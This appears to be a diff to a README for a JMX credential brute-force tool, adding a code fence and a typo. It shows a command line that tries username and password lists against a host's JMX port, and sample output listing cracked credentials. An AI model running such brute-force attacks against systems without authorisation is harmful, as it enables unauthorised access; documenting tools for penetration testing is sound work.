@@ -16,11 +16,10 @@ java -jar jmxbf.jar
 Example:
    
 $>java –jar jmxbf.jar –h 192.168.20.1 –p 1099 –uf usernames.txt –pf passwords.txt
-
 		
-		
-Some example output below:
+Some samp;e output below:
 
+```
 $>java –jar jmxbf.jar –h 192.168.20.1 –p 1099 –uf usernames.txt –pf passwords.txt
 
 Auth failed!!!
@@ -65,4 +64,6 @@ The following valid credentials were found:
 
 
 control:supersecretpwd
+
 monitor:monitor
+```
